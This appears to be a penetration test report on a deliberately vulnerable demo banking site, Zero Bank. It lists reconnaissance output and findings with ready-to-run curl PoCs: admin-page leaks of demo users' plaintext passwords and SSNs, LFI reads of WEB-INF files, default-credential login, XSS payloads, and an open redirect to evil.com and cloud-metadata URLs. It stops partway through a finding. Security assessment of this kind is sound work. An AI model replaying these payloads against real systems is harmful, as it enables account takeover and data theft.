# Web Application Penetration Test Report

## Target Information

| Field | Value |
|---|---|
| **Target URL** | `http://zero.webappsecurity.com` |
| **Mode** | Pentest (full exploitation) |
| **Test Window (UTC)** | 2026-08-02 23:00 → 2026-08-03 00:07 |
| **Resolved IP** | 54.82.22.214 (ec2-54-82-22-214.compute-1.amazonaws.com, AWS us-east-1) |
| **Hosting** | Amazon AWS (public demo site published by Micro Focus Fortify) |
| **Application** | "Zero Bank" — Micro Focus WebInspect deliberately-vulnerable banking demo |
| **Tech Stack** | Apache Tomcat 7.0.70 (Coyote/1.1) fronted by Apache 2.2.22 (Win32) + mod_ssl 2.2.22 + OpenSSL 0.9.8t + mod_jk 1.2.37 on port 443; Spring MVC 3.2 + Spring Security + CXF SOAP + HSQLDB; jQuery 1.8.2; Bootstrap 2.x |
| **WAF** | None detected (`wafw00f`: no WAF) |
| **TLS posture** | SSLv2/SSLv3/TLSv1.0 only; TLS 1.1/1.2/1.3 disabled; expired certificate |

---

## Executive Summary

The Zero Bank demonstration application presents a broad, severe attack surface. The assessment confirmed **13 distinct, exploitable findings** spanning every OWASP risk category, including **two Critical** issues that grant unauthenticated full-account takeover (plaintext credential disclosure via the open admin panel) and arbitrary server-side configuration file disclosure (LFI of `WEB-INF/web.xml` and the Spring Security / persistence / web-service beans).

The server itself is built on end-of-life components (Apache 2.2.x from 2012, OpenSSL 0.9.8 from 2007, Tomcat 7.0.70 from 2016) and only negotiates SSLv2/SSLv3/TLSv1.0 — protocols broken since 2014 (POODLE, DROWN, BEAST). The TLS certificate expired on 2022-05-04 and is presently invalid.

No WAF or rate-limiting is deployed, default application credentials (`username/password`) are valid, and the Tomcat Manager Application is exposed (HTTP 401 with Basic realm). Reflected XSS was confirmed in two distinct sinks, an unvalidated-redirect sink is present, and verbose Java stack traces are returned to clients in both the web UI and SOAP fault channels, leaking internal class names, line numbers, and the private IP `10.5.157.10`.

Because this is a deliberately vulnerable training app, "remediation" is academic; findings are still mapped to real CWE/WSTG/ASVS controls to demonstrate the structural fixes required in a production banking application.

---

## Reconnaissance & Service Enumeration Results

### Port Scan (`nmap -sV -sC -p 1-10000`)

| Port | Service | Version | Notable |
|---|---|---|---|
| 80/tcp | http | Apache Tomcat/Coyote JSP engine 1.1 | PUT/DELETE/TRACE/PATCH in `Allow` |
| 443/tcp | ssl/http | Apache 2.2.6 (Win32) mod_ssl/2.2.6 OpenSSL/0.9.8e mod_jk/1.2.40 | SSLv2 enabled, cert expired 2022-05-04, TRACE allowed |
| 8080/tcp | http | Apache Tomcat/Coyote JSP engine 1.1 | PUT/DELETE/TRACE/PATCH in `Allow` |

rDNS: `ec2-54-82-22-214.compute-1.amazonaws.com`.

### TLS Analysis (`sslscan`)

- SSLv2 **enabled**, SSLv3 **enabled**, TLSv1.0 enabled; TLSv1.1/1.2/1.3 **disabled**.
- Insecure session renegotiation supported.
- TLS Compression enabled (CRIME vector).
- No TLS Fallback SCSV.
- 40-bit export ciphers accepted (`TLS_RSA_EXPORT_WITH_RC4_40_MD5`, `EXPORT_WITH_RC2_CBC_40_MD5`, `EXPORT_WITH_DES40_CBC_SHA`).
- RC4 ciphers accepted.
- Certificate: CN=zero.webappsecurity.com, O=Micro Focus LLC, CA=DigiCert TLS RSA SHA256 2020 CA1, **NotAfter 2022-05-04 23:59:59 GMT** (expired >4 years).

### Fingerprinting (`whatweb`)

Apache, Bootstrap, HTML5, jQuery 1.8.2, HTTPServer `Apache-Coyote/1.1`, `Access-Control-Allow-Origin: *`, `X-UA-Compatible: IE=Edge`.

### Content Discovery (`gau` + `katana` + `gobuster`)

Discovered live endpoints: `/`, `/index.html`, `/login.html`, `/signin.html`, `/search.html`, `/online-banking.html`, `/feedback.html`, `/sendFeedback.html`, `/forgot-password.html`, `/forgotten-password-send.html`, `/faq.html`, `/help.html`, `/logout.html`, `/bank/` (auth-required, 302), `/bank/account-summary.html`, `/bank/account-activity.html`, `/bank/account-activity-show-transactions.html`, `/bank/account-activity-find-transactions.html`, `/bank/transfer-funds.html`, `/bank/transfer-funds-verify.html`, `/bank/transfer-funds-confirm.html`, `/bank/pay-bills.html`, `/bank/pay-bills-saved-payee.html`, `/bank/pay-bills-new-payee.html`, `/bank/money-map.html`, `/bank/online-statements.html`, `/bank/redirect.html`, `/admin/`, `/admin/index.html`, `/admin/users.html`, `/admin/currencies.html`, `/debug.txt`, `/readme.txt`, `/server-status`, `/docs/`, `/errors/` (directory listing + `errors.log`), `/manager/html` (401), `/cgi-bin/` (403), `/web-services` (CXF service list), `/web-services/infoService?wsdl`, `/web-services/secureInfoService?wsdl`.

### Nikto Highlights

- `Access-Control-Allow-Origin: *`.
- Allowed methods: GET, HEAD, POST, **PUT, DELETE, TRACE, OPTIONS, PATCH**.
- `/server-status` exposed (mod_status).
- `/readme.txt` present.
- Missing security headers: CSP, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy.

---

## Detailed Findings

Findings are ordered by severity. Each includes a verifiable PoC captured during this engagement.

---

### CRIT-01 — Unauthenticated Admin Panel Leaking Plaintext Credentials & SSNs

| Field | Value |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-312 (Cleartext Storage of Sensitive Information) |
| **WSTG** | WSTG-ATHZ-01 (Authorization Bypass), WSTG-ATHN-01 (Authentication for Path Traversal) |
| **ASVS v4** | V4.1.1, V4.1.3 (Access Control), V9.2.2 (Sensitive Data) |
| **Endpoint** | `GET /admin/`, `GET /admin/users.html`, `GET /admin/currencies.html` |
| **Auth required** | None |

**Description**
The `/admin/` directory and its child pages (`index.html`, `users.html`, `currencies.html`) are reachable without any authentication. `/admin/users.html` renders a table of every application user, exposing their **name, plaintext password, and Social Security Number (SSN)**. This single endpoint yields complete account takeover for all 8 users with no effort.

**PoC — Timestamp:** 2026-08-02T23:13:26Z

**PoC — Request:**
```http
GET /admin/users.html HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (excerpt, line 132–152 of the returned HTML):**
```html
<table class="table">
  <thead>
    <tr><th>Name</th><th>Password</th><th>SSN</th></tr>
  </thead>
  <tbody>
    <tr><td>Leeroy Jenkins</td><td>VIZ10AWT8VL</td><td>536-48-3769</td></tr>
    <tr><td>Stephen Bowen</td><td>OTZ07BXM0BE</td><td>607-58-7435</td></tr>
    <tr><td>Linus Moran</td><td>FKO04SXA7TI</td><td>247-54-1719</td></tr>
    <tr><td>Nero Chan</td><td>TXJ77CQO5EI</td><td>578-13-3713</td></tr>
    <tr><td>Kadeem Higgins</td><td>MFC50OQE7VO</td><td>449-20-3206</td></tr>
    <tr><td>Quinn Burks</td><td>HWZ97ZUM3NK</td><td>008-70-6738</td></tr>
    <tr><td>Davis Thompson</td><td>RGD78SHB0TG</td><td>574-56-1932</td></tr>
    <tr><td>Lester Keller</td><td>EIJ79NLT0TP</td><td>330-58-4012</td></tr>
  </tbody>
</table>
```

**One-line proof:** An unauthenticated `GET /admin/users.html` returns the names, plaintext passwords, and SSNs of all 8 application users.

**Reproduction:**
1. `curl -s http://zero.webappsecurity.com/admin/users.html`
2. Observe the `<table>` containing plaintext `Password` and `SSN` columns.

**Impact:** Full account takeover of every user; PCI-DSS / GLBA / state-privacy violations for SSN disclosure; complete loss of confidentiality, integrity, and availability of user funds.

**Recommendation (structural):**
- Enforce a server-side, role-based access control (RBAC) layer at the framework level (e.g., Spring Security `@PreAuthorize("hasRole('ADMIN')")` or an interceptor with explicit allow-lists). Never rely on URL obscurity.
- Store credentials only as adaptive hashes (bcrypt/scrypt/argon2id with per-user salt + work factor). Never store or render plaintext passwords.
- Store SSNs only encrypted at rest (AES-256-GCM, envelope-encrypted KMS-managed keys) and never render them to any client; mask to last-4.
- Add a CI/CD SAST rule (e.g., Fortify, SonarQube, Semgrep) that fails the build when `password` / `ssn` fields are bound to a view without masking and without an authorization annotation.
- Deploy an automated security gate (e.g., OWASP ZAP baseline scan in the pipeline) that fails when `/admin/*` returns 200 without an `admin` session.

---

### CRIT-02 — Local File Inclusion (LFI) via `help.html?topic=` — Full `WEB-INF` Disclosure

| Field | Value |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1** | 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-22 (Path Traversal), CWE-552 (Files Accessible to External Parties) |
| **WSTG** | WSTG-INPV-09 (Testing for Local File Inclusion) |
| **ASVS v4** | V12.3.1 (File upload & path traversal) |
| **Endpoint** | `GET /help.html?topic=<relative-or-absolute-path>` |
| **Auth required** | None |

**Description**
The `topic` query parameter of `/help.html` is concatenated into a server-side file read without canonicalisation or allow-listing. An unauthenticated attacker can read any file inside the web application's classpath root, including `WEB-INF/web.xml`, the Spring bean configuration XMLs, and (because the servlet container is Windows-based) potentially arbitrary OS files.

**PoC — Timestamp:** 2026-08-03T00:05:12Z

**PoC — Request:**
```http
GET /help.html?topic=WEB-INF/classes/spring/spring-security.xml HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (10,438 bytes, excerpt showing the Spring Security bean graph):**
```xml
<beans ...>
  <bean id="loginUrlAuthenticationEntryPoint"
        class="org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint">
    <constructor-arg value="/login.html"/>
  </bean>
  <security:authentication-manager alias="authenticationManager">
    <security:authentication-provider user-service-ref="userServiceImpl"/>
  </security:authentication-manager>
  <bean id="usernamePasswordAuthenticationFilter"
        class="org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter">
    <property name="usernameParameter" value="user_login"/>
    <property name="passwordParameter" value="user_password"/>
    <property name="filterProcessesUrl" value="/signin.html"/>
    ...
  </bean>
  <security:http auto-config="false" entry-point-ref="authenticationEntryPoint">
    <security:intercept-url pattern="/auth/accept-certs.html" requires-channel="https"/>
    <security:intercept-url pattern="/bank/*" access="ROLE_CLIENT"/>
    <security:anonymous username="anonymousUser"/>
  </security:http>
</beans>
```

Additional files confirmed readable via the same parameter:
- `WEB-INF/web.xml` (14,989 bytes — servlets, filters, mappings)
- `WEB-INF/classes/spring/spring-master.xml` (imports `spring-persistence.xml`, `spring-service.xml`, `spring-emulation.xml`, `spring-security.xml`, `spring-webservice.xml`)
- `WEB-INF/classes/spring/spring-webservice.xml` (CXF endpoints, `faultStackTraceEnabled=true`)

**One-line proof:** `curl -s "http://zero.webappsecurity.com/help.html?topic=WEB-INF/classes/spring/spring-security.xml"` returns the full Spring Security configuration including the authentication provider and role rules.

**Reproduction:**
1. `curl -s "http://zero.webappsecurity.com/help.html?topic=WEB-INF/web.xml" | grep -E 'servlet|filter'`
2. `curl -s "http://zero.webappsecurity.com/help.html?topic=WEB-INF/classes/spring/spring-security.xml"`

**Impact:** Full disclosure of the application's security architecture, bean wiring, interceptor order, role mappings, and (in `spring-persistence.xml`) potentially database credentials — enabling targeted follow-on attacks (auth bypass, SQLi, RCE via deserialization if any Jackson/XStream beans are revealed). On the Windows backend, path traversal to OS files is plausible.

**Recommendation (structural):**
- Replace the file-include pattern with a strict allow-list of help topic IDs mapped to fixed file paths server-side (e.g., `Map<String,Path> ALLOWED = {"topic1": "/help/topic1.html", ...}`); reject any input not in the map.
- Canonicalise (`Path.toRealPath()`) and verify the resolved path starts with the dedicated `help/` directory before reading.
- Add a SAST rule (Fortify "Path Manipulation", Semgrep `java.lang.security.audit.path-traversal`) as a CI gate.
- Configure Tomcat `DefaultServlet` `listings=false` and deny direct serving of `WEB-INF/*` (the container does this by default; the application code is bypassing it via the LFI).

---

### HIGH-01 — Default / Hardcoded Credentials Accepted

| Field | Value |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 8.6 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-521 (Weak Password Requirements) |
| **WSTG** | WSTG-ATHN-04 (Testing for Default or Guessable Credentials) |
| **ASVS v4** | V2.1.1, V2.5.1 |
| **Endpoint** | `POST /signin.html` |
| **Auth required** | None |

**Description**
The login page itself embeds a tooltip (`Login/Password - username/password`) disclosing the default credentials, and the backend accepts them. A single POST authenticates and grants `ROLE_CLIENT` access to the full `/bank/*` surface.

**PoC — Timestamp:** 2026-08-02T23:34:03Z

**PoC — Request:**
```http
POST /signin.html HTTP/1.1
Host: zero.webappsecurity.com
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<session>

user_login=username&user_password=password&user_token=759f1600-9b24-4a53-8f08-d0130676e329&submit=Sign+in
```

**PoC — Verbatim response (headers):**
```http
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=F0A3716B; Path=/; HttpOnly
Location: /auth/accept-certs.html?user_token=759f1600-9b24-4a53-8f08-d0130676e329
```

**One-line proof:** `curl -d "user_login=username&user_password=password&user_token=<token>&submit=Sign+in" http://zero.webappsecurity.com/signin.html` returns `302` with a `Set-Cookie: JSESSIONID=...` confirming successful authentication.

**Reproduction:**
1. `curl -s -c cookies.txt http://zero.webappsecurity.com/login.html -o login.html`
2. Extract `user_token` from `login.html`.
3. `curl -s -b cookies.txt -c cookies.txt -d "user_login=username&user_password=password&user_token=$TOKEN&submit=Sign+in" http://zero.webappsecurity.com/signin.html`
4. Confirm `Set-Cookie: JSESSIONID=...` and `302` to `/auth/accept-certs.html`.

**Impact:** Anonymous attackers obtain full authenticated banking access; combined with CRIT-01 (admin panel) the entire user base is compromised without brute-forcing.

**Recommendation (structural):**
- Enforce forced password change on first login for any seeded account; disable or rotate all default credentials before deployment.
- Remove the credentials tooltip from `login.html`.
- Add a CI/CD secret-scan gate (gitleaks, trufflehog) that fails the build when credentials are committed.
- Deploy an automated DAST gate (ZAP baseline) that fails when `username/password` returns a 302 to a post-login URL.

---

### HIGH-02 — Reflected XSS in JavaScript Context via `accountId` (GET, authenticated)

| Field | Value |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` (PR:L because `/bank/*` requires `ROLE_CLIENT`) |
| **CWE** | CWE-79 (Reflected XSS) |
| **WSTG** | WSTG-INPV-02 (Reflected XSS) |
| **ASVS v4** | V5.3.3 (Output encoding per context) |
| **Endpoint** | `GET /bank/account-activity.html?accountId=<payload>` |
| **Auth required** | `ROLE_CLIENT` |

**Description**
The `accountId` GET parameter is interpolated unencoded into a JavaScript statement inside a `<script>` block of the response: `console.log(<user input>);`. Because no JS-context encoding is applied, an attacker who supplies a payload such as `window.alert(document.cookie)//` causes the browser to execute arbitrary script in the victim's authenticated session.

**PoC — Timestamp:** 2026-08-03T00:06:40Z

**PoC — Request:**
```http
GET /bank/account-activity.html?accountId=window.alert(document.cookie)// HTTP/1.1
Host: zero.webappsecurity.com
Cookie: JSESSIONID=07C35B3C
```

**PoC — Verbatim response (line 133 of the returned HTML):**
```html
<script type="text/javascript">
    $(function () {
        $("#tabs").tabs();
    });

        console.log(window.alert(document.cookie)//);

</script>
```

**One-line proof:** The reflected value `window.alert(document.cookie)//` is inserted unencoded into `console.log(...)` inside a `<script>` block, executing `alert(document.cookie)` in the victim's browser.

**Reproduction:**
1. Authenticate and obtain a `JSESSIONID` (see HIGH-01).
2. `curl -s -b cookies.txt "http://zero.webappsecurity.com/bank/account-activity.html?accountId=window.alert(document.cookie)//"`
3. Observe `console.log(window.alert(document.cookie)//);` in the response `<script>` block.

**Impact:** Session theft (`document.cookie`), CSRF-token exfiltration, keylogging, automated fund transfers in the victim's context. Because `/bank/*` is the post-login surface, victims are guaranteed to hold a valid session.

**Recommendation (structural):**
- Adopt a framework-level output-encoding API that selects the encoder by context (OWASP Java Encoder `Encoder.forJavaScript(value)`); never interpolate request parameters directly into `<script>` blocks.
- Move diagnostic `console.log` calls out of production builds (or gate them behind a debug flag).
- Deploy a Content-Security-Policy header (`script-src 'self'`) as a defence-in-depth XSS mitigation.
- Add a SAST rule (Semgrep `java.spring.security.reflected-xss-in-script`) and a DAST XSS rule that asserts payloads injected into `accountId` are not reflected unencoded.

---

### HIGH-03 — Reflected XSS via `accountId` POST (Unescaped Stack-Trace Page)

| Field | Value |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 6.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| **CWE** | CWE-79 (Reflected XSS), CWE-209 (Information Exposure Through an Error Message) |
| **WSTG** | WSTG-INPV-02, WSTG-ERR-01 |
| **ASVS v4** | V5.3.3, V7.4.1 |
| **Endpoint** | `POST /bank/account-activity-show-transactions.html` with `accountId=<non-numeric payload>` |
| **Auth required** | `ROLE_CLIENT` |

**Description**
When a non-numeric value is supplied for `accountId` (parsed via `Long.parseLong`), the application throws a `java.lang.NumberFormatException` and renders an error page whose `<pre>` block echoes the offending input **without HTML encoding**. A `<script>` tag in the input is parsed by the browser as live script.

**PoC — Timestamp:** 2026-08-02T23:52:04Z (sqlmap heuristic also flagged the parameter as XSS-prone)

**PoC — Request:**
```http
POST /bank/account-activity-show-transactions.html HTTP/1.1
Host: zero.webappsecurity.com
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=07C35B3C

accountId=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

**PoC — Verbatim response (line 128):**
```html
<pre>
...
Caused by: java.lang.NumberFormatException: For input string: "<script>alert(1)</script>"
    at java.lang.NumberFormatException.forInputString(Unknown Source)
    at java.lang.Long.parseLong(Unknown Source)
    at java.lang.Long.parseLong(Unknown Source)
    at com.hp.webinspect.zero.web.controller.BankingController.accountActivityShowTransactionsForAccount(BankingController.java:124)
    ... 73 more
</pre>
```

**One-line proof:** The unencoded string `<script>alert(1)</script>` is reflected inside a `<pre>` block of an HTML error page; browsers parse `<script>` even inside `<pre>`, so `alert(1)` fires.

**Reproduction:**
1. Authenticate.
2. `curl -s -b cookies.txt --data-urlencode "accountId=<script>alert(1)</script>" "http://zero.webappsecurity.com/bank/account-activity-show-transactions.html"`
3. Observe `<script>alert(1)</script>` unescaped in the `<pre>` block.

**Impact:** Reflected XSS in an authenticated context; additionally the stack trace discloses internal class names (`com.hp.webinspect.zero.web.controller.BankingController`) and source line numbers (`BankingController.java:124`), facilitating targeted exploitation.

**Recommendation (structural):**
- Configure a global error handler (`@ControllerAdvice` in Spring MVC) that returns a generic error page to clients and logs details server-side only; never reflect request input in error output.
- HTML-encode any user-controlled value before rendering (OWASP Java Encoder `Encoder.forHtmlContent`).
- Disable Tomcat's `showServerInfo` and set `reportExceptions` off in `catalina.properties`.
- Add a CI SAST rule (Fortify "Privacy Violation" / "Information Exposure Through Error") and a DAST rule that asserts no response body contains `NumberFormatException` or `<stack trace>` patterns.

---

### HIGH-04 — Open Redirect via `/bank/redirect.html?url=`

| Field | Value |
|---|---|
| **Severity** | High (in a banking context: phishing amplification) |
| **CVSS v3.1** | 6.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **CWE** | CWE-601 (URL Redirection to Untrusted Site) |
| **WSTG** | WSTG-INPV-11 (Unvalidated Redirects and Forwards) |
| **ASVS v4** | V12.5.1 |
| **Endpoint** | `GET /bank/redirect.html?url=<absolute-URL>` |
| **Auth required** | `ROLE_CLIENT` |

**Description**
The `url` query parameter is used verbatim as the `Location` header value in a 302 response. Any absolute URL — including external sites, `file://`, and RFC1918 addresses — is accepted.

**PoC — Timestamp:** 2026-08-02T23:34:40Z

**PoC — Request:**
```http
GET /bank/redirect.html?url=https://evil.com/ HTTP/1.1
Host: zero.webappsecurity.com
Cookie: JSESSIONID=07C35B3C
```

**PoC — Verbatim response (headers):**
```http
HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Location: https://evil.com/
Content-Length: 0
```

Additional payloads verified:
| `url=` | Resulting `Location` |
|---|---|
| `//evil.com/` | `http://evil.com/` |
| `http://169.254.169.254/latest/meta-data/` | `http://169.254.169.254/latest/meta-data/` |
| `file:///etc/passwd` | `file:///etc/passwd` |
| `http://127.0.0.1:8080/manager/html` | `http://127.0.0.1:8080/manager/html` |

**One-line proof:** `curl -i "http://zero.webappsecurity.com/bank/redirect.html?url=https://evil.com/"` returns `Location: https://evil.com/`.

**Reproduction:** `curl -s -o /dev/null -w "%{redirect_url}\n" "http://zero.webappsecurity.com/bank/redirect.html?url=https://evil.com/"`

**Impact:** Trusted-domain phishing (`zero.webappsecurity.com` → attacker site); potential SSRF if any downstream component follows the redirect server-side (not observed here — confirmed client-side 302 only).

**Recommendation (structural):**
- Replace the open redirect with a server-side allow-list of permitted internal targets (`url=account-summary` → `/bank/account-summary.html`); reject absolute URLs.
- If external redirects are genuinely required, require an intermediate interstitial page that explicitly asks the user to confirm leaving the site.
- Add a SAST rule for unvalidated-redirect sinks (Fortify "Open Redirect", Semgrep `java.spring.security.open-redirect`) and a DAST gate that asserts `/bank/redirect.html?url=https://external/` does not return a 302 to the external host.

---

### HIGH-05 — End-of-Life TLS Configuration (SSLv2/SSLv3, Expired Cert, RC4, Export Ciphers)

| Field | Value |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 8.2 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| **CWE** | CWE-327 (Broken/Risky Crypto), CWE-295 (Improper Certificate Validation), CWE-326 (Inadequate Encryption Strength) |
| **WSTG** | WSTG-CRYP-01, WSTG-CRYP-02 |
| **ASVS v4** | V9.1.1, V9.1.2, V9.1.3 |
| **Endpoint** | `https://zero.webappsecurity.com:443` |

**Description**
The HTTPS listener negotiates only SSLv2, SSLv3, and TLSv1.0 — all formally deprecated by IETF RFC 7568 (SSLv3) and RFC 8996 (TLS 1.0/1.1). The cipher suite list includes 40-bit export ciphers, RC4, and 56-bit DES. The server certificate expired on **2022-05-04** and has been invalid for over 4 years. Insecure session renegotiation and TLS compression are enabled (CRIME/BEAST vectors).

**PoC — Timestamp:** 2026-08-02T23:02:42Z (sslscan) / 2026-08-02T23:01 (nmap)

**PoC — Verbatim `sslscan` output (excerpt):**
```
SSLv2     enabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   disabled
TLSv1.2   disabled
TLSv1.3   disabled
TLS Fallback SCSV: Server does not support
TLS renegotiation: Insecure session renegotiation supported
TLS Compression: enabled (CRIME)
Accepted  TLSv1.0  40 bits   TLS_RSA_EXPORT_WITH_RC4_40_MD5
Accepted  TLSv1.0  128 bits  TLS_RSA_WITH_RC4_128_MD5
Accepted  TLSv1.0  40 bits   TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
Not valid after:  May  4 23:59:59 2022 GMT
```

**One-line proof:** `sslscan --no-failed zero.webappsecurity.com` reports SSLv2/SSLv3 enabled and `Not valid after: May 4 23:59:59 2022 GMT`.

**Reproduction:** `sslscan --no-failed zero.webappsecurity.com | grep -E 'SSLv2|SSLv3|TLSv1|RC4|EXPORT|Not valid'`

**Impact:** Passive decryption of "secure" traffic via POODLE (SSLv3), DROWN (SSLv2), BEAST (TLS 1.0), CRIME (compression); active downgrade attacks; man-in-the-middle attacks because the expired certificate cannot be validated by any modern client. Banking credentials, session cookies, and SSNs transmitted over this channel are effectively in cleartext.

**Recommendation (structural):**
- Upgrade to a current OpenSSL (≥ 3.0) and Apache (≥ 2.4.x) build; disable SSLv2/SSLv3/TLSv1.0/TLSv1.1 entirely.
- Enable TLS 1.3 + TLS 1.2 only, with a modern cipher suite list (ECDHE + AES-GCM / ChaCha20-Poly1305); remove RC4, 3DES, EXPORT, and all CBC suites.
- Disable TLS compression and insecure renegotiation.
- Automate certificate lifecycle management via ACME (Let's Encrypt) or an internal CA with automated renewal 30 days before expiry; alert on certificate expiry.
- Add a continuous-monitoring gate (testssl.sh / sslyze) in CI that fails the deployment when any SSLv2/SSLv3/TLS 1.0 endpoint is detected or when the certificate is within 30 days of expiry.

---

### MED-01 — Permissive CORS (`Access-Control-Allow-Origin: *`)

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-942 (Permissive Cross-domain Policy) |
| **WSTG** | WSTG-CLNT-07 (CORS) |
| **ASVS v4** | V14.5.3 |
| **Endpoint** | All responses from `http://zero.webappsecurity.com/` |
| **Auth required** | None |

**Description**
Every HTTP response — including authenticated endpoints — returns `Access-Control-Allow-Origin: *`. While the wildcard does not by itself permit credentialed cross-origin requests (browsers block `credentials: 'include'` when the ACAO is `*`), it permits any third-party page to perform cross-origin reads of any non-credentialled response. In a banking context this still leaks the existence and shape of authenticated endpoints and any data returned without a session (e.g., `/admin/users.html`, `/debug.txt`).

**PoC — Timestamp:** 2026-08-03T00:04:30Z

**PoC — Request:**
```http
GET / HTTP/1.1
Host: zero.webappsecurity.com
Origin: https://evil.com
```

**PoC — Verbatim response header:**
```http
Access-Control-Allow-Origin: *
```

**One-line proof:** `curl -s -i -H "Origin: https://evil.com" http://zero.webappsecurity.com/ | grep Access-Control` → `Access-Control-Allow-Origin: *`.

**Reproduction:** `curl -s -i -H "Origin: https://evil.com" http://zero.webappsecurity.com/ | grep -i origin`

**Impact:** Cross-origin exfiltration of any response that does not require cookies (which includes the admin panel and debug logs in this app); widens the blast radius of CRIT-01 and INFO-02.

**Recommendation (structural):**
- Replace the wildcard with an explicit allow-list of trusted origins reflected back only when the request `Origin` matches.
- Set `Access-Control-Allow-Credentials: true` only for authenticated endpoints and only for allow-listed origins.
- Add a DAST rule that fails when an untrusted `Origin` header is reflected in `Access-Control-Allow-Origin`.

---

### MED-02 — Verbose Java Stack Traces & Internal Class Disclosure (Web + SOAP)

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | CWE-209 (Information Exposure Through an Error Message), CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
| **WSTG** | WSTG-ERR-01, WSTG-ERR-02 |
| **ASVS v4** | V7.4.1, V14.3.2 |
| **Endpoints** | Any error page (e.g., `POST /bank/account-activity-show-transactions.html` with non-numeric `accountId`); `POST /web-services/infoService` (any SOAP request) |
| **Auth required** | Varies |

**Description**
Error responses return full Java stack traces including internal class names, method names, and source line numbers (e.g., `BankingController.java:124`). The CXF SOAP endpoints (`/web-services/infoService`) return `faultStackTraceEnabled=true` with the full `com.hp.webinspect.zero.ws.interceptor.SoapVulnerabilityEmulationInjector` call chain.

**PoC — Timestamp:** 2026-08-02T23:52:04Z (web) / 2026-08-02T23:55Z (SOAP)

**PoC — Request (SOAP):**
```http
POST /web-services/infoService HTTP/1.1
Host: zero.webappsecurity.com
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:zer="http://www.hp.com/webinspect/zerows">
  <soap:Body><zer:findAllUsers/></soap:Body>
</soap:Envelope>
```

**PoC — Verbatim response (excerpt, 3,861 bytes):**
```xml
<soap:Fault>
  <faultcode>soap:Server</faultcode>
  <faultstring>Fault occurred while processing.</faultstring>
  <detail>
    <stackTrace xmlns="http://cxf.apache.org/fault">
com.hp.webinspect.zero.ws.interceptor.SoapVulnerabilityEmulationInjector!findAndEmulateMappedVulnerabilities!SoapVulnerabilityEmulationInjector.java!54
com.hp.webinspect.zero.ws.interceptor.SoapVulnerabilityEmulationInjector!handleMessage!...java!46
org.apache.cxf.phase.PhaseInterceptorChain!doIntercept!...271
...
org.apache.catalina.connector.CoyoteAdapter!service!CoyoteAdapter.java!442
    </stackTrace>
  </detail>
</soap:Fault>
```

**One-line proof:** `curl -H "Content-Type: text/xml" --data '<soap:Envelope...><zer:findAllUsers/></soap:Body></soap:Envelope>' http://zero.webappsecurity.com/web-services/infoService` returns a SOAP fault with a multi-frame Java stack trace.

**Reproduction:** See CRIT-02 PoC for the web variant; the SOAP variant above.

**Impact:** Internal architecture disclosure accelerates an attacker's reconnaissance (frameworks, versions, controller method names, line numbers) and enables precision targeting of subsequent exploits (e.g., deserialization gadgets, known CVEs in named library versions).

**Recommendation (structural):**
- Configure a global `@ControllerAdvice` exception handler that returns a sanitised error payload (correlation ID only) to clients and logs the full trace server-side.
- In CXF, set `faultStackTraceEnabled=false` and `exceptionMessageCauseEnabled=false` in production (`jaxws:features` / `org.apache.cxf.logging`).
- Add a DAST rule that fails any response containing `at <package>.<Class>.<method>(<File>.java:<line>)` or `org.apache.catalina` strings.

---

### MED-03 — Permissive HTTP Methods (PUT / DELETE / PATCH / TRACE)

| Field | Value |
|---|---|
| **Severity** | Medium |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` |
| **CWE** | CWE-650 (Trusting HTTP Permission Methods) |
| **WSTG** | WSTG-CONF-06 (HTTP Methods) |
| **ASVS v4** | V12.4.1 |
| **Endpoint** | `OPTIONS /` (and all resources) on ports 80, 8080 |
| **Auth required** | None |

**Description**
`OPTIONS` returns `Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH`. PUT attempts are accepted by the connector (returning 403 from the read-only filesystem rather than 405) and TRACE, while returning 405 here, is advertised.

**PoC — Timestamp:** 2026-08-02T23:03:17Z (nikto) / 2026-08-03T00:04:35Z (TRACE)

**PoC — Request:**
```http
OPTIONS / HTTP/1.1
Host: zero.webappsecurity.com
```

**PoC — Verbatim response (header):**
